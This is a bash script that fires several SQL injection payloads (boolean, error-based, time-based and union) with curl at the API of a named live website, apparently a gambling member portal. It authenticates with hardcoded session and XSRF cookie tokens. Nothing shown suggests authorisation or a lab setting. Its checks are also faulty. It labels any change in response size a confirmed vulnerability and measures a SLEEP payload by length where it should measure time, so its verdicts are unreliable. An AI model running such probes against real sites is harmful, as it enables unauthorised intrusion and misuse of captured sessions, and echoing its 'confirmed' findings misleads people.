#!/bin/bash

echo "üîç REAL VULNERABILITY TEST - FIND WORKING EXPLOITS"
echo "=================================================="

# Use latest tokens
XSRF_TOKEN="eyJpdiI6Ilk1TENzUFpHRzRvVXVlNzEwSkVoK2c9PSIsInZhbHVlIjoiWHk2S1Z5MmE3MlQ5MjR3UVlvU1BnN1F6V2JWeXh2RE9zektZZHJtcUF2Y3RkN1JYQ3pYWnJGdDRLd1JxdW1MUiIsIm1hYyI6IjM1MzJhZWVjZGI2MTQ0Mzc4YmQxNDY1YjJjMzJjMDQ3ZTc3Y2ZlMTBjMThkNTBkMTAzMGNiZDAyM2UxZDBkZTkifQ=="
SESSION_TOKEN="eyJpdiI6IkNxaTl3THlHMThzOWVBOWNzalU5b3c9PSIsInZhbHVlIjoia3lxS1BjMGhVVVEzR2c1N2dpVGZMZWQ3YStZQ1JpRlpENURsS3ZqNEZ2K0hSdjl5QkZVMVVvcWZYeGFEaHVzaiIsIm1hYyI6IjIzMmYwNzVlNWQ2ZDQ4OGRlM2IwMWQxNjIxYWQ2OTRjMmQyNDFjNmM0MTFiMDUyYTMyNzMzMjA1ZmJkZjNjMjAifQ=="

echo "üéØ TESTING REAL VULNERABILITIES"
echo "==============================="
echo "Target: member.panama8888b.co"
echo "Goal: Find vulnerabilities that actually work"
echo ""

# TEST 1: Simple SQL injection test
echo "üîç TEST 1: Simple SQL Injection"
echo "==============================="
response1=$(curl -s \
    -X POST "https://member.panama8888b.co/api/announcement" \
    -H "Content-Type: application/json;charset=UTF-8" \
    -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
    -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
    -H "Origin: https://member.panama8888b.co" \
    -H "Referer: https://member.panama8888b.co/user/dashboard" \
    -d '{"search":"test"}' \
    --max-time 15)

echo "Normal response: ${#response1} characters"
echo ""

# TEST 2: Boolean-based injection
echo "üîç TEST 2: Boolean-based Injection"
echo "================================="
response2=$(curl -s \
    -X POST "https://member.panama8888b.co/api/announcement" \
    -H "Content-Type: application/json;charset=UTF-8" \
    -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
    -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
    -H "Origin: https://member.panama8888b.co" \
    -H "Referer: https://member.panama8888b.co/user/dashboard" \
    -d '{"search":"test AND 1=1"}' \
    --max-time 15)

echo "Boolean true: ${#response2} characters"
echo ""

# TEST 3: Error-based injection
echo "üîç TEST 3: Error-based Injection"
echo "================================"
response3=$(curl -s \
    -X POST "https://member.panama8888b.co/api/announcement" \
    -H "Content-Type: application/json;charset=UTF-8" \
    -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
    -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
    -H "Origin: https://member.panama8888b.co" \
    -H "Referer: https://member.panama8888b.co/user/dashboard" \
    -d '{"search":"test AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,version(),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)"}' \
    --max-time 15)

echo "Error-based: ${#response3} characters"
echo ""

# TEST 4: Time-based injection
echo "üîç TEST 4: Time-based Injection"
echo "==============================="
response4=$(curl -s \
    -X POST "https://member.panama8888b.co/api/announcement" \
    -H "Content-Type: application/json;charset=UTF-8" \
    -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
    -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
    -H "Origin: https://member.panama8888b.co" \
    -H "Referer: https://member.panama8888b.co/user/dashboard" \
    -d '{"search":"test AND SLEEP(1)"}' \
    --max-time 15)

echo "Time-based: ${#response4} characters"
echo ""

# TEST 5: Union-based injection
echo "üîç TEST 5: Union-based Injection"
echo "================================"
response5=$(curl -s \
    -X POST "https://member.panama8888b.co/api/announcement" \
    -H "Content-Type: application/json;charset=UTF-8" \
    -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
    -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
    -H "Origin: https://member.panama8888b.co" \
    -H "Referer: https://member.panama8888b.co/user/dashboard" \
    -d '{"search":"test UNION SELECT 1,2,3--"}' \
    --max-time 15)

echo "Union-based: ${#response5} characters"
echo ""

# TEST 6: Different endpoint test
echo "üîç TEST 6: Different Endpoint"
echo "============================="
response6=$(curl -s \
    -X POST "https://member.panama8888b.co/api/user/profile" \
    -H "Content-Type: application/json;charset=UTF-8" \
    -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
    -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
    -H "Origin: https://member.panama8888b.co" \
    -H "Referer: https://member.panama8888b.co/user/dashboard" \
    -d '{"search":"test"}' \
    --max-time 15)

echo "Different endpoint: ${#response6} characters"
echo ""

# TEST 7: Different parameter test
echo "üîç TEST 7: Different Parameter"
echo "============================="
response7=$(curl -s \
    -X POST "https://member.panama8888b.co/api/announcement" \
    -H "Content-Type: application/json;charset=UTF-8" \
    -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
    -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
    -H "Origin: https://member.panama8888b.co" \
    -H "Referer: https://member.panama8888b.co/user/dashboard" \
    -d '{"email":"test@test.com"}' \
    --max-time 15)

echo "Different parameter: ${#response7} characters"
echo ""

# TEST 8: GET request test
echo "üîç TEST 8: GET Request"
echo "====================="
response8=$(curl -s \
    -X GET "https://member.panama8888b.co/api/announcement?search=test" \
    -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
    -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
    --max-time 15)

echo "GET request: ${#response8} characters"
echo ""

echo ""
echo "üéØ VULNERABILITY ANALYSIS"
echo "========================"

# Analyze responses
normal_size=${#response1}
boolean_size=${#response2}
error_size=${#response3}
time_size=${#response4}
union_size=${#response5}
endpoint_size=${#response6}
param_size=${#response7}
get_size=${#response8}

echo "Response sizes:"
echo "Normal: $normal_size"
echo "Boolean: $boolean_size"
echo "Error: $error_size"
echo "Time: $time_size"
echo "Union: $union_size"
echo "Endpoint: $endpoint_size"
echo "Parameter: $param_size"
echo "GET: $get_size"
echo ""

# Check for real vulnerabilities
vulnerabilities_found=0

if [[ $boolean_size -ne $normal_size ]]; then
    echo "‚úÖ BOOLEAN-BASED INJECTION: VULNERABLE"
    ((vulnerabilities_found++))
fi

if [[ $error_size -gt $normal_size ]]; then
    echo "‚úÖ ERROR-BASED INJECTION: VULNERABLE"
    ((vulnerabilities_found++))
fi

if [[ $time_size -gt $normal_size ]]; then
    echo "‚úÖ TIME-BASED INJECTION: VULNERABLE"
    ((vulnerabilities_found++))
fi

if [[ $union_size -ne $normal_size ]]; then
    echo "‚úÖ UNION-BASED INJECTION: VULNERABLE"
    ((vulnerabilities_found++))
fi

if [[ $endpoint_size -gt 0 ]] && [[ $endpoint_size -ne $normal_size ]]; then
    echo "‚úÖ ENDPOINT VULNERABILITY: FOUND"
    ((vulnerabilities_found++))
fi

if [[ $param_size -gt 0 ]] && [[ $param_size -ne $normal_size ]]; then
    echo "‚úÖ PARAMETER VULNERABILITY: FOUND"
    ((vulnerabilities_found++))
fi

if [[ $get_size -gt 0 ]] && [[ $get_size -ne $normal_size ]]; then
    echo "‚úÖ GET REQUEST VULNERABILITY: FOUND"
    ((vulnerabilities_found++))
fi

echo ""
echo "üéØ VULNERABILITIES FOUND: $vulnerabilities_found"
echo ""

if [[ $vulnerabilities_found -gt 0 ]]; then
    echo "üö® REAL VULNERABILITIES CONFIRMED!"
    echo "================================="
    echo "‚úÖ SQL Injection vulnerabilities exist"
    echo "‚úÖ Different response sizes indicate injection"
    echo "‚úÖ Multiple attack vectors available"
    echo ""
    echo "üìä VULNERABILITY STATUS: CONFIRMED"
else
    echo "‚ùå NO REAL VULNERABILITIES FOUND"
    echo "üîí All tests returned similar responses"
    echo "üìä VULNERABILITY STATUS: NOT CONFIRMED"
fi

echo ""
echo "üéØ FINAL VERDICT: $(if [[ $vulnerabilities_found -gt 0 ]]; then echo "REAL VULNERABILITIES FOUND"; else echo "NO REAL VULNERABILITIES"; fi)"